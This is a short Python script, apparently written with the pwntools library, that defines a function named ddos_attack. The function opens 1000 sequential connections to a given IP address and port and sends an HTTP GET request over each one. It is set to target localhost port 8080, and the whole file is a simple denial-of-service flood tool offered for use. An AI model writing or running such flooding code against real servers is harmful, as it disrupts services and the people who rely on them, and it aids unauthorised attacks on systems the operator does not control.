from pwn import *


def ddos_attack(ip, port):
    for _ in range(1000):
        target = remote(ip, port)
        target.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        target.close()

if __name__ == "__main__":
    ip = "localhost"
    port = 8080
    ddos_attack(ip, port)    
